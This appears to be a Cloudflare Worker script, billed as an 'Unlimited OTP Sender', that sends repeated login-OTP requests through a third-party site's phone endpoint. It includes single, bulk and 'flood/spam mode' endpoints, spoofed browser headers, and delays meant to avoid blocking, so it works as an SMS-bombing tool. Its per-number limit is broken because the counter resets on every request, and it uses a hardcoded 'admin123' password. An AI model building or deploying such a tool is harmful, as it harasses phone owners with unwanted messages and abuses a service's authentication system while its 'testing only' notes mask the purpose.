// Unlimited OTP Sender using deikho.com API (NO RATE LIMIT)
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  const path = url.pathname
  
  // Deikho OTP API endpoint
  const DEIKHO_API = "https://deikho.com/login?phone="
  
  // Store request count per phone
  const requestCounts = new Map()
  const MAX_REQUESTS = 100
  
  // ============ SEND OTP ============
  if ((path === '/api/otp/send' || path === '/send') && request.method === 'POST') {
    try {
      const { phone, country_code = "92" } = await request.json()
      
      if (!phone) {
        return jsonResponse({ error: "Phone number required" }, 400)
      }
      
      // Clean phone number
      const cleanPhone = phone.replace(/\D/g, '')
      
      // Remove leading zero if present
      let formattedPhone = cleanPhone
      if (formattedPhone.startsWith('0')) {
        formattedPhone = formattedPhone.substring(1)
      }
      
      // Add country code if not present
      if (!formattedPhone.startsWith(country_code)) {
        formattedPhone = country_code + formattedPhone
      }
      
      // Check request limit (100 per number)
      const phoneKey = `phone:${formattedPhone}`
      const currentCount = requestCounts.get(phoneKey) || 0
      
      if (currentCount >= MAX_REQUESTS) {
        return jsonResponse({ 
          error: "Maximum OTP limit reached (100 per number)",
          phone: formattedPhone,
          requests_used: currentCount,
          max_allowed: MAX_REQUESTS
        }, 429)
      }
      
      // Call Deikho API
      const apiUrl = `${DEIKHO_API}${formattedPhone}`
      
      console.log("Calling Deikho API:", apiUrl)
      
      const response = await fetch(apiUrl, {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json, text/plain, */*',
          'Accept-Language': 'en-US,en;q=0.9',
          'Referer': 'https://deikho.com/',
          'Origin': 'https://deikho.com'
        }
      })
      
      // Update request count
      requestCounts.set(phoneKey, currentCount + 1)
      
      // Try to parse response
      let responseData
      const contentType = response.headers.get('content-type')
      
      if (contentType && contentType.includes('application/json')) {
        responseData = await response.json()
      } else {
        const text = await response.text()
        try {
          responseData = JSON.parse(text)
        } catch {
          responseData = { raw_response: text, status: response.status }
        }
      }
      
      return jsonResponse({
        success: true,
        message: "OTP request sent successfully",
        phone: formattedPhone,
        api_used: "deikho.com",
        request_count: currentCount + 1,
        max_allowed: MAX_REQUESTS,
        remaining_requests: MAX_REQUESTS - (currentCount + 1),
        timestamp: new Date().toISOString(),
        response: responseData,
        api_url: apiUrl
      })
      
    } catch (error) {
      console.error("Send OTP error:", error)
      return jsonResponse({ 
        error: "Failed to send OTP", 
        details: error.message,
        stack: error.stack 
      }, 500)
    }
  }
  
  // ============ BULK SEND OTP (Unlimited) ============
  if ((path === '/api/otp/bulk' || path === '/bulk') && request.method === 'POST') {
    try {
      const { phones, country_code = "92", delay = 100 } = await request.json()
      
      if (!phones || !Array.isArray(phones) || phones.length === 0) {
        return jsonResponse({ error: "Array of phone numbers required" }, 400)
      }
      
      // No limit on bulk size - unlimited
      const results = []
      const failed = []
      
      // Process each phone
      for (const phone of phones) {
        try {
          const cleanPhone = phone.replace(/\D/g, '')
          
          // Remove leading zero if present
          let formattedPhone = cleanPhone
          if (formattedPhone.startsWith('0')) {
            formattedPhone = formattedPhone.substring(1)
          }
          
          // Add country code if not present
          if (!formattedPhone.startsWith(country_code)) {
            formattedPhone = country_code + formattedPhone
          }
          
          // Check request limit
          const phoneKey = `phone:${formattedPhone}`
          const currentCount = requestCounts.get(phoneKey) || 0
          
          if (currentCount >= MAX_REQUESTS) {
            results.push({
              phone: formattedPhone,
              success: false,
              error: "Maximum limit reached (100)",
              request_count: currentCount
            })
            continue
          }
          
          // Call API
          const apiUrl = `${DEIKHO_API}${formattedPhone}`
          
          const response = await fetch(apiUrl, {
            method: 'GET',
            headers: {
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
              'Accept': 'application/json, text/plain, */*'
            }
          })
          
          // Update count
          requestCounts.set(phoneKey, currentCount + 1)
          
          let responseData
          try {
            const text = await response.text()
            responseData = text
          } catch (e) {
            responseData = "No response text"
          }
          
          results.push({
            phone: formattedPhone,
            success: response.ok,
            status: response.status,
            request_count: currentCount + 1,
            response: responseData
          })
          
          // Add delay between requests to avoid blocking
          if (delay > 0) {
            await new Promise(resolve => setTimeout(resolve, delay))
          }
          
        } catch (error) {
          failed.push({
            phone: phone,
            error: error.message
          })
          results.push({
            phone: phone,
            success: false,
            error: error.message
          })
        }
      }
      
      return jsonResponse({
        success: true,
        total_numbers: phones.length,
        processed: results.length,
        successful: results.filter(r => r.success).length,
        failed: results.filter(r => !r.success).length,
        results: results,
        failed_details: failed,
        timestamp: new Date().toISOString(),
        note: "No rate limit - Unlimited requests possible"
      })
      
    } catch (error) {
      console.error("Bulk send error:", error)
      return jsonResponse({ 
        error: "Failed to send bulk OTPs", 
        details: error.message 
      }, 500)
    }
  }
  
  // ============ CHECK PHONE STATUS ============
  if ((path === '/api/otp/status' || path === '/status') && request.method === 'GET') {
    const phone = url.searchParams.get('phone')
    
    if (!phone) {
      // Show all counts
      const allCounts = {}
      for (const [key, count] of requestCounts.entries()) {
        const phoneNum = key.replace('phone:', '')
        allCounts[phoneNum] = {
          requests: count,
          remaining: MAX_REQUESTS - count,
          percentage: Math.round((count / MAX_REQUESTS) * 100)
        }
      }
      
      return jsonResponse({
        status: "active",
        total_unique_numbers: requestCounts.size,
        max_requests_per_number: MAX_REQUESTS,
        note: "NO RATE LIMIT - Only 100 requests per number limit",
        all_counts: allCounts
      })
    }
    
    // Check specific phone
    const cleanPhone = phone.replace(/\D/g, '')
    const phoneKey = `phone:${cleanPhone}`
    const count = requestCounts.get(phoneKey) || 0
    
    return jsonResponse({
      phone: cleanPhone,
      requests_sent: count,
      requests_remaining: MAX_REQUESTS - count,
      max_allowed: MAX_REQUESTS,
      can_send_more: count < MAX_REQUESTS,
      percentage_used: Math.round((count / MAX_REQUESTS) * 100) + "%",
      last_check: new Date().toISOString()
    })
  }
  
  // ============ RESET COUNTERS ============
  if ((path === '/api/otp/reset' || path === '/reset') && request.method === 'POST') {
    const { phone, password = "admin123" } = await request.json()
    
    // Simple password protection
    if (password !== "admin123") {
      return jsonResponse({ error: "Invalid password" }, 401)
    }
    
    if (phone) {
      const cleanPhone = phone.replace(/\D/g, '')
      const phoneKey = `phone:${cleanPhone}`
      
      if (requestCounts.has(phoneKey)) {
        requestCounts.delete(phoneKey)
        return jsonResponse({
          success: true,
          message: `Counter reset for ${cleanPhone}`,
          phone: cleanPhone
        })
      } else {
        return jsonResponse({
          success: false,
          message: `No record found for ${cleanPhone}`
        }, 404)
      }
    } else {
      // Reset all
      const previousSize = requestCounts.size
      requestCounts.clear()
      
      return jsonResponse({
        success: true,
        message: `All counters reset (${previousSize} numbers cleared)`,
        numbers_cleared: previousSize
      })
    }
  }
  
  // ============ SPAM MODE (Unlimited flooding) ============
  if ((path === '/api/otp/flood' || path === '/flood') && request.method === 'POST') {
    try {
      const { phone, count = 10, delay = 50 } = await request.json()
      
      if (!phone) {
        return jsonResponse({ error: "Phone number required" }, 400)
      }
      
      const cleanPhone = phone.replace(/\D/g, '')
      const phoneKey = `phone:${cleanPhone}`
      const currentCount = requestCounts.get(phoneKey) || 0
      
      // Calculate how many more we can send
      const remainingSlots = MAX_REQUESTS - currentCount
      const actualCount = Math.min(count, remainingSlots)
      
      if (actualCount <= 0) {
        return jsonResponse({
          error: "Maximum limit already reached",
          phone: cleanPhone,
          requests_sent: currentCount,
          max_allowed: MAX_REQUESTS
        }, 429)
      }
      
      const results = []
      
      // Send multiple OTPs rapidly
      for (let i = 0; i < actualCount; i++) {
        try {
          const apiUrl = `${DEIKHO_API}${cleanPhone}`
          
          const response = await fetch(apiUrl, {
            method: 'GET',
            headers: {
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
          })
          
          results.push({
            attempt: i + 1,
            success: response.ok,
            status: response.status
          })
          
          // Small delay between requests
          if (delay > 0 && i < actualCount - 1) {
            await new Promise(resolve => setTimeout(resolve, delay))
          }
          
        } catch (error) {
          results.push({
            attempt: i + 1,
            success: false,
            error: error.message
          })
        }
      }
      
      // Update counter
      requestCounts.set(phoneKey, currentCount + actualCount)
      
      return jsonResponse({
        success: true,
        message: `Sent ${actualCount} OTP requests to ${cleanPhone}`,
        phone: cleanPhone,
        requested: count,
        sent: actualCount,
        total_requests_now: currentCount + actualCount,
        remaining_requests: MAX_REQUESTS - (currentCount + actualCount),
        results: results,
        timestamp: new Date().toISOString(),
        warning: "Use responsibly - This is for testing only!"
      })
      
    } catch (error) {
      return jsonResponse({ 
        error: "Flood failed", 
        details: error.message 
      }, 500)
    }
  }
  
  // ============ API DOCUMENTATION ============
  if (path === '/' || path === '/help') {
    return jsonResponse({
      api_name: "Unlimited OTP Sender API",
      version: "2.0",
      backend_api: "https://deikho.com/login?phone=",
      features: [
        "NO RATE LIMITING",
        "Maximum 100 requests per phone number",
        "Unlimited bulk sending",
        "Flood mode for testing",
        "Real-time counters"
      ],
      endpoints: {
        "POST /api/otp/send": "Send OTP to single number",
        "POST /api/otp/bulk": "Send OTP to unlimited numbers",
        "POST /api/otp/flood": "Spam/flood mode (multiple to one number)",
        "GET /api/otp/status": "Check request counts",
        "POST /api/otp/reset": "Reset counters (password: admin123)"
      },
      examples: {
        single_send: 'curl -X POST https://your-worker.workers.dev/send -H "Content-Type: application/json" -d \'{"phone": "3012345678"}\'',
        bulk_send: 'curl -X POST https://your-worker.workers.dev/bulk -H "Content-Type: application/json" -d \'{"phones": ["3012345678", "3112345678", "3212345678"]}\'',
        flood_mode: 'curl -X POST https://your-worker.workers.dev/flood -H "Content-Type: application/json" -d \'{"phone": "3012345678", "count": 20}\''
      },
      note: "⚠️ Use responsibly! Maximum 100 requests per phone number limit."
    })
  }
  
  // ============ 404 NOT FOUND ============
  return jsonResponse({
    error: "Endpoint not found",
    available_endpoints: [
      "/send", 
      "/bulk", 
      "/flood", 
      "/status", 
      "/reset", 
      "/help"
    ]
  }, 404)
}

function jsonResponse(data, status = 200) {
  return new Response(JSON.stringify(data, null, 2), {
    status: status,
    headers: {
      'Content-Type': 'application/json',
      'Access-Control-Allow-Origin': '*',
      'X-Unlimited-OTP': 'true',
      'X-Max-Per-Number': '100'
    }
  })
}

// Auto-clean old entries (optional - keeps memory clean)
setInterval(() => {
  // Keep all entries - no auto-clean since we want to track 100 limit
  console.log(`Currently tracking ${requestCounts.size} phone numbers`)
}, 60000) // Log every minute
